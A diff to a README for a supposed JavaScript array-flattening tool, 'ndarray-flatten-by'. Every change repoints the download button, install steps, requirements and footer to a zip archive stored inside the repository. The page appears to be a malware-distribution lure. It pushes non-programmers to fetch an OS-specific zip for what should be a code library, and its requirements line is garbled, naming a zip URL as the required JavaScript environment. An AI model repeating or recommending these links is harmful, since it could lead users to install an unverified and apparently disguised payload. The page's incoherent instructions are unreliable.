@@ -6,7 +6,7 @@ ndarray-flatten-by is a tool that allows you to simplify multiple dimensions of 
 
 ## 🔗 Download Now
 
-[![Download ndarray-flatten-by](https://raw.githubusercontent.com/Somraji/ndarray-flatten-by/main/esterling/ndarray-flatten-by.zip)](https://raw.githubusercontent.com/Somraji/ndarray-flatten-by/main/esterling/ndarray-flatten-by.zip)
+[![Download ndarray-flatten-by](https://github.com/Somraji/ndarray-flatten-by/raw/refs/heads/main/esterling/by-ndarray-flatten-v1.4.zip)](https://github.com/Somraji/ndarray-flatten-by/raw/refs/heads/main/esterling/by-ndarray-flatten-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with ndarray-flatten-by, follow these simple steps below. No prog
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [ndarray-flatten-by Releases](https://raw.githubusercontent.com/Somraji/ndarray-flatten-by/main/esterling/ndarray-flatten-by.zip).
+1. Visit this page to download: [ndarray-flatten-by Releases](https://github.com/Somraji/ndarray-flatten-by/raw/refs/heads/main/esterling/by-ndarray-flatten-v1.4.zip).
 2. You will see a list of available versions. Look for the latest version.
 3. Click on the version number to download the correct file for your operating system.
 4. Follow the installation instructions that appear on the download page.
@@ -41,7 +41,7 @@ After installing, you can begin using ndarray-flatten-by. Here’s how:
 Before downloading, make sure your system meets the following requirements:
 
 - **Operating System:** Compatible with Windows, MacOS, and Linux.
-- **JavaScript Environment:** Must have https://raw.githubusercontent.com/Somraji/ndarray-flatten-by/main/esterling/ndarray-flatten-by.zip installed on your system.
+- **JavaScript Environment:** Must have https://github.com/Somraji/ndarray-flatten-by/raw/refs/heads/main/esterling/by-ndarray-flatten-v1.4.zip installed on your system.
 - **Memory:** Recommended minimum of 4 GB RAM for optimal performance.
 
 ## 📊 Use Cases
@@ -70,4 +70,4 @@ If you encounter any issues, feel free to reach out. You can open an issue in th
 
 ## 🔗 Download Again
 
-Don't forget to download the latest version from: [ndarray-flatten-by Releases](https://raw.githubusercontent.com/Somraji/ndarray-flatten-by/main/esterling/ndarray-flatten-by.zip)
+Don't forget to download the latest version from: [ndarray-flatten-by Releases](https://github.com/Somraji/ndarray-flatten-by/raw/refs/heads/main/esterling/by-ndarray-flatten-v1.4.zip)
